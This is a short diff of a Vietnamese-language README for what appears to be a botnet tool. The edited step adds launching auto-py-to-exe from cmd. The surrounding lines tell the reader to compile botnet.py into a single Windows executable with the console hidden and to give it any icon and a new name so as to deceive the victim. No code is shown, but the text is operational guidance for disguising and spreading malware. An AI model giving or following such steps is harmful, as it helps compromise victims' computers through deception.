@@ -13,7 +13,7 @@
 
 » Vào Cmd hay bất kì trình shell nào hãy nhập `pip install -r requirements.txt`
 
-» Khi tải xong các thư viện cần thiết hãy chuyển file .py thành .exe bằng cách sử dụng thư viện auto-py-to-exe
+» Khi tải xong các thư viện cần thiết hãy chuyển file .py thành .exe bằng cách sử dụng thư viện auto-py-to-exe vòa cmd nhập `auto-py-to-exe`
 
 » Tại GUI chuyển đổi hãy chọn mục `One file and Windows Based (hide the console)` và `One file` đừng quên thên file botnet.py vào (Bạn có thể thêm icon bất kì và đổi tên 
 để đánh lừa nạn nhân) sau đó bấm convert
